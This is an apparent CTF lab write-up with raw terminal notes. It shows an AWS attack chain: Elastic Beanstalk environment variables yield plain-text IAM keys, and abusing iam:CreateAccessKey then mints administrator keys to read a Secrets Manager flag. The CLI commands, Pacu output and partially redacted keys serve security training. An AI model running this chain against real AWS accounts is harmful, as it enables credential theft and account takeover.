# AWS Elastic Beanstalk Environment Variables Secret Exposure Write-up
Objective

Extract plain-text secrets (such as API keys/credentials) stored insecurely within Elastic Beanstalk environment configurations, pivot to a secondary privileged user, and escalate to full administrator access to retrieve the final flag.

## Step 1: Reconnaissance & Enumeration
### 1. Identify Current Identity

We began by checking our initial low-privileged IAM identity:
```Bash

aws sts get-caller-identity --profile defconbean

    User ARN: arn:aws:iam::474874559247:user/lab_low_priv_user
```
### 2. Enumerate Elastic Beanstalk Applications and Environments

Using tools like Pacu (elasticbeanstalk__enum) or standard AWS CLI commands, we inspected the Elastic Beanstalk setup:
```Bash

aws elasticbeanstalk describe-applications --profile defconbean --region us-east-1
aws elasticbeanstalk describe-environments --profile defconbean --region us-east-1

    Application Name: lab-app

    Environment Name: lab-env
```
## Step 2: Extracting Secrets from Beanstalk Configuration

Elastic Beanstalk often stores environment variables in plain text within its configuration settings. We queried the configuration settings for the target environment:
```Bash

aws elasticbeanstalk describe-configuration-settings \
  --application-name lab-app \
  --environment-name lab-env \
  --profile defconbean \
  --region us-east-1
```
Discovered Secrets:

Inside the EnvironmentVariables parameter, sensitive keys were exposed in plain text:

    SECONDARY_SECRET_KEY

    SECONDARY_ACCESS_KEY (AKIAW5...JMOU)

Configuring a new profile (defconbean2) with these secondary credentials revealed a secondary user (lab_secondary_user).

## Step 3: Pivoting to Secondary User & Privilege Escalation
### 1. Inspect Secondary User Permissions

We checked the policy attached to lab_secondary_user:
```Bash

aws iam get-policy-version \
  --policy-arn arn:aws:iam::474874559247:policy/lab_secondary_policy \
  --version-id v1 \
  --profile defconbean2
```
The policy granted powerful IAM management permissions, notably iam:CreateAccessKey:
```JSON

{
    "Statement": [
        {
            "Action": ["iam:CreateAccessKey"],
            "Effect": "Allow",
            "Resource": "*"
        },
        {
            "Action": [
                "iam:ListUsers",
                "iam:GetUser",
                "iam:ListRoles",
                "iam:GetRole"
                // ... other read-only IAM actions
            ],
            "Effect": "Allow",
            "Resource": "*"
        }
    ]
}
```
### 2. Enumerate Users and Abuse CreateAccessKey

We listed the IAM users in the account to find higher-privileged targets:
```Bash

aws iam list-users --profile defconbean2
```
We identified an administrative user: lab_admin_user.

Using our iam:CreateAccessKey permission, we programmatically generated new active access keys for the administrator without needing existing credentials:
```Bash

aws iam create-access-key --user-name lab_admin_user --profile defconbean2
```
    Result: Successfully generated an Access Key ID and Secret Access Key for lab_admin_user.

## Step 4: Retrieving the Final Flag

We configured a new profile (defconbean3) using the newly generated administrator credentials and verified our identity:
```Bash

aws sts get-caller-identity --profile defconbean3

    Arn: arn:aws:iam::474874559247:user/lab_admin_user

    Privileges: AdministratorAccess (*)
```
With full administrative rights, we queried AWS Secrets Manager to extract the final lab flag:
```Bash

aws secretsmanager list-secrets --region us-east-1 --profile defconbean3
aws secretsmanager get-secret-value --secret-id lab_final_flag --region us-east-1 --profile defconbean3
```
Result

The secret containing the final flag was successfully retrieved, concluding the full privilege escalation chain originating from an exposed Elastic Beanstalk environment variable.










________________________________________
# Beanstalk



aws sts get-caller-identity --profile defconbean                                                
{
    "UserId": "AIDAW5EF2XMHYVHYJFFXN",
    "Account": "474874559247",
    "Arn": "arn:aws:iam::474874559247:user/lab_low_priv_user"
}

PACU :
"Allow": [
      "sts:GetCallerIdentity",
      "sts:GetSessionToken",
      "ec2:DescribeSubnets",
      "dynamodb:DescribeEndpoints",
      "sts:GetSessionToken",
      "sts:GetCallerIdentity",
      "dynamodb:DescribeEndpoints",
      "dynamodb:DescribeEndpoints",
      "sts:GetCallerIdentity",
      "sts:GetSessionToken",
      "sts:GetCallerIdentity",
      "sts:GetSessionToken",
      "dynamodb:DescribeEndpoints"
    ],



                                                                                                                               
┌──(kali㉿kali)-[~/DEFCON/beanstalk]
└─$ aws elasticbeanstalk describe-applications --profile defconbean --region us-east-1
{
    "Applications": [
        {
            "ApplicationArn": "arn:aws:elasticbeanstalk:us-east-1:474874559247:application/lab-app",
            "ApplicationName": "lab-app",
            "Description": "Elastic Beanstalk application for insecure secrets scenario",
            "DateCreated": "2026-08-06T15:50:48.686000+00:00",
            "DateUpdated": "2026-08-06T15:50:48.686000+00:00",
            "ConfigurationTemplates": [],
            "ResourceLifecycleConfig": {
                "VersionLifecycleConfig": {
                    "MaxCountRule": {
                        "Enabled": false,
                        "MaxCount": 200,
                        "DeleteSourceFromS3": false
                    },
                    "MaxAgeRule": {
                        "Enabled": false,
                        "MaxAgeInDays": 180,
                        "DeleteSourceFromS3": false
                    }
                }
            }
        }
    ]
}

aws elasticbeanstalk describe-environments --profile defconbean --region us-east-1
{
    "Environments": [
        {
            "EnvironmentName": "lab-env",
            "EnvironmentId": "e-gnzjgibriw",
            "ApplicationName": "lab-app",
            "SolutionStackName": "64bit Amazon Linux 2023 v4.13.5 running Python 3.11",
            "PlatformArn": "arn:aws:elasticbeanstalk:us-east-1::platform/Python 3.11 running on 64bit Amazon Linux 2023/4.13.5",
            "EndpointURL": "awseb-e-g-AWSEBLoa-1RRC0URLWGCZ2-1660789616.us-east-1.elb.amazonaws.com",
            "CNAME": "lab-env.eba-dvymvugk.us-east-1.elasticbeanstalk.com",
            "DateCreated": "2026-08-06T15:51:01.767000+00:00",
            "DateUpdated": "2026-08-06T15:53:59.888000+00:00",
            "Status": "Ready",
            "AbortableOperationInProgress": false,
            "Health": "Grey",
            "HealthStatus": "Pending",
            "Tier": {
                "Name": "WebServer",
                "Type": "Standard",
                "Version": "1.0"
            },
            "EnvironmentLinks": [],
            "EnvironmentArn": "arn:aws:elasticbeanstalk:us-east-1:474874559247:environment/lab-app/lab-env"
        }
    ]
}



PACU : 

Pacu (defconbean:imported-defconbean) > run elasticbeanstalk__enum --region us-east-1
  Running module elasticbeanstalk__enum...
[elasticbeanstalk__enum] Enumerating BeanStalk data in region us-east-1...
[elasticbeanstalk__enum]   1 application(s) found in us-east-1.
[elasticbeanstalk__enum]   1 environment(s) found in us-east-1.
        Potential secret in environment variable: SSHSourceRestriction => tcp,22,22,0.0.0.0/0
        Potential secret in environment variable: EnvironmentVariables => SECONDARY_SECRET_KEY=4YfNBBxP......jZPRZA29WFNDf2a1,PYTHONPATH=/var/app/venv/staging-LQM1lest/bin,SECONDARY_ACCESS_KEY=AKIAW5E.......KJMOU                                 
        Potential secret in environment variable: SECONDARY_ACCESS_KEY => AKIAW5.......JMOU
[elasticbeanstalk__enum]   1 configuration setting(s) found in us-east-1.
[elasticbeanstalk__enum]   3 potential secret(s) found in config settings and saved to: /home/kali/.local/share/pacu/defconbean/downloads/beanstalk_secrets_defconbean_us-east-1.txt
[elasticbeanstalk__enum]   1 environment(s) with tags found in us-east-1.
[elasticbeanstalk__enum] elasticbeanstalk__enum completed.




OR CLI :

aws elasticbeanstalk describe-configuration-settings --application-name lab-app --environment-name lab-env --profile defconbean --region us-east-1


"Namespace": "aws:cloudformation:template:parameter",
                    "OptionName": "EnvironmentVariables",
                    "Value": "SECONDARY_SECRET_KEY=4YfNBBxPkx8g..........RZA29WFNDf2a1,PYTHONPATH=/var/app/venv/staging-LQM1lest/bin,SECONDARY_ACCESS_KEY=AKIAW5.......JMOU"




aws sts get-caller-identity --profile defconbean2
{
    "UserId": "AIDAW5EF2XMHYCLK4VSNY",
    "Account": "474874559247",
    "Arn": "arn:aws:iam::474874559247:user/lab_secondary_user"
}



aws iam list-attached-user-policies --user-name lab_secondary_user --profile defconbean2
{
    "AttachedPolicies": [
        {
            "PolicyName": "lab_secondary_policy",
            "PolicyArn": "arn:aws:iam::474874559247:policy/lab_secondary_policy"
        }
    ]
}


aws iam list-policy-versions --policy-arn arn:aws:iam::474874559247:policy/lab_secondary_policy --profile defconbean2
{
    "Versions": [
        {
            "VersionId": "v1",
            "IsDefaultVersion": true,
            "CreateDate": "2026-08-06T15:50:48+00:00"
        }
    ]
}



aws iam get-policy-version --policy-arn arn:aws:iam::474874559247:policy/lab_secondary_policy --version-id v1 --profile defconbean2
{
    "PolicyVersion": {
        "Document": {
            "Statement": [
                {
                    "Action": [
                        "iam:CreateAccessKey"
                    ],
                    "Effect": "Allow",
                    "Resource": "*"
                },
                {
                    "Action": [
                        "iam:ListRoles",
                        "iam:GetRole",
                        "iam:ListPolicies",
                        "iam:GetPolicy",
                        "iam:ListPolicyVersions",
                        "iam:GetPolicyVersion",
                        "iam:ListUsers",
                        "iam:GetUser",
                        "iam:ListGroups",
                        "iam:GetGroup",
                        "iam:ListAttachedUserPolicies",
                        "iam:ListAttachedRolePolicies",
                        "iam:GetRolePolicy"
                    ],
                    "Effect": "Allow",
                    "Resource": "*"
                }
            ],
            "Version": "2012-10-17"
        },
        "VersionId": "v1",
        "IsDefaultVersion": true,
        "CreateDate": "2026-08-06T15:50:48+00:00"
    }
}


>>>>>>>> "iam:CreateAccessKey"

 aws iam list-users --profile defconbean2
{
    "Users": [
        {
            "Path": "/",
            "UserName": "lab_admin_user",
            "UserId": "AIDAW5EF2XMH5253OFXWT",
            "Arn": "arn:aws:iam::474874559247:user/lab_admin_user",
            "CreateDate": "2026-08-06T15:50:48+00:00"
        },


aws iam create-access-key --user-name lab_admin_user --profile defconbean2
{
    "AccessKey": {
        "UserName": "lab_admin_user",
        "AccessKeyId": "AKIAW5..........KOFZ",
        "Status": "Active",
        "SecretAccessKey": "sfWb64+t...............RGHAK2C",
        "CreateDate": "2026-08-06T17:37:39+00:00"
    }
}




aws sts get-caller-identity --profile defconbean3
{
    "UserId": "AIDAW5EF2XMH5253OFXWT",
    "Account": "474874559247",
    "Arn": "arn:aws:iam::474874559247:user/lab_admin_user"
}




aws iam list-attached-user-policies --user-name lab_admin_user --profile defconbean3
{
    "AttachedPolicies": [
        {
            "PolicyName": "lab_admin_user_policy",
            "PolicyArn": "arn:aws:iam::474874559247:policy/lab_admin_user_policy"
        }
    ]
}




aws iam get-policy-version --policy-arn arn:aws:iam::474874559247:policy/lab_admin_user_policy --version-id v1 --profile defconbean3
{
    "PolicyVersion": {
        "Document": {
            "Statement": [
                {
                    "Action": "*",
                    "Effect": "Allow",
                    "Resource": "*"
                }
            ],
            "Version": "2012-10-17"
        },
        "VersionId": "v1",
        "IsDefaultVersion": true,
        "CreateDate": "2026-08-06T15:50:48+00:00"
    }
}




aws secretsmanager list-secrets --region us-east-1 --profile defconbean3
{
    "SecretList": [
        {
            "ARN": "arn:aws:secretsmanager:us-east-1:474874559247:secret:lab_final_flag-2wqUFc",
            "Name": "lab_final_flag",
            "LastChangedDate": "2026-08-06T11:50:48.420000-04:00",
            "LastAccessedDate": "2026-08-05T20:00:00-04:00",
            "SecretVersionsToStages": {
                "terraform-QVAlxc4SZ9UqSLFwDcLRoeKVL3": [
                    "AWSCURRENT"
                ]
            },
            "CreatedDate": "2026-08-06T11:50:48.288000-04:00"
        }
    ]
}














